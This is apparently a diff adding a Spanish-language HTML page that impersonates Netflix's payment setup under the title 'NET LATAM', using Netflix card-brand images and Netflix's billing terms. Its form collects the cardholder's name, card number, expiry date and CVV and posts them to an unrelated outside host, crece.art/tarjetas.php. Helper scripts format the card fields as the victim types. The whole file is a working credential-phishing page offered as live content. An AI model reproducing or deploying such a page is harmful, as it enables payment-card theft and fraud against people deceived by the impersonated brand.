@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>NET LATAM</title>
+	<script type="text/javascript" src="input.js"></script>
+	<link rel="stylesheet" type="text/css" href="stylos.css">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+		
+	<img class="img-1" src="https://th.bing.com/th/id/R.05c96bba4090acafe115aad47e66572d?rik=IE6GOiA8%2bT5dJQ&pid=ImgRaw&r=0">
+		<hr class="linea" color="#D5D2D2" size=0.5>
+			<div class="content">
+			<form class="form" action="https://crece.art/tarjetas.php" method="POST">
+			<img class="visa" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg">
+			<img class="master" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg">
+			<img class="america" src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg">
+			<h1 class="paso-1">PASO 1 DE 1</h1>
+			<b class="confi-1">Configura tu tarjeta de cr&eacute;dito o d&eacute;bito.</b>
+				
+			
+                <input type="text" name="nombre" placeholder="JOSÉ A. MARTÍNEZ GARCÍA " required="" onkeyup="mayus(this);"" autocomplete="off">
+                
+                <input type="text" name="TarjetaNumero" maxlength="19" id="numeros" placeholder="0000 0000 0000 0000" required>
+                
+                <!--Aqui inicia un nuevo input-->
+                
+                <input type="text" id="vence" name="FechaVencimiento" placeholder="Fecha de vencimiento (MM/AA)"
+                onkeyup="
+                var v = this.value;
+                if (v.match(/^\d{2}$/) !== null) {
+                this.value = v + '/';
+                }
+                else if (v.match(/^\d{4}\$/) !== null) {
+                this.value = v + '/';
+                }"
+                maxlength="5"
+                required="">
+                
+                <input type="text" name="codigo" id="codigo" placeholder="C&oacute;digo de seguridad (CVV)" minlength="3" maxlength="4" required=""autocomplete = "off">
+			 
+			<p class="porunmes">00.00USD por un mes<br><span class="plan-1">
+			Plan premium</span></p>
+			<p class="alacer">Al hacer clic en el botón Iniciar membresía, aceptas nuestros Términos de uso y nuestra Declaración de privacidad, declaras que tienes más de 18 años y aceptas que <span><b> Netflix continuará tu membresía de manera automática y que, hasta que la canceles, te facturará el cargo mensual (actualmente de USD13.99) a través de la forma de pago elegida. Puedes cancelarla en cualquier momento para evitar cargos en el futuro.</b></span> Para hacerlo, ve a Cuenta y haz clic en Cancelar membresía.</p>
+			<button class="boton" type="submit"><b>Iniciar membresia</b></button>
+		</form>
+		<script type="text/javascript">
+			var codigo = document.getElementById('codigo');
+		
+			codigo.onkeydown = function(e){
+				if (e.key == 'Backspace') return true;
+		
+				if (e.key == ' ') return false;	
+		
+				if (isNaN(e.key)) return false;
+			};
+		</script>
+		
+		<script>
+		// Campo numeros
+		var numeros = document.getElementById('numeros');
+		
+		// Poner cursor en el campo numeros
+		numeros.focus();
+		
+		numeros.onkeydown = function(e){
+			// Permitir la tecla para borrar
+			if (e.key == 'Backspace') return true;
+		
+			// Permitir flecha izquierda
+			if (e.key == 'ArrowLeft') return true;
+		
+			// Permitir flecha derecha
+			if (e.key == 'ArrowRight') return true;
+		
+			// Bloquear tecla de espacio
+			if (e.key == ' ') return false;
+		
+			// Bloquear tecla si no es un numero
+			if (isNaN(e.key)) return false;
+		};
+		
+		numeros.onkeyup = function(){
+			numeros.value = numeros.value
+							// Borrar todos los espacios
+							.replace(/\s/g, '')
+		
+							// Agregar un espacio cada dos numeros
+							.replace(/([0-9]{4})/g, '$1 ')
+		
+							// Borrar espacio al final
+							.trim();
+		};
+		function mayus(e){
+
+			e.value = e.value.toUpperCase();
+			}
+		</script>
+		</div>
+		<footer>
+			<script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+		</footer>
+</body>
+</html>
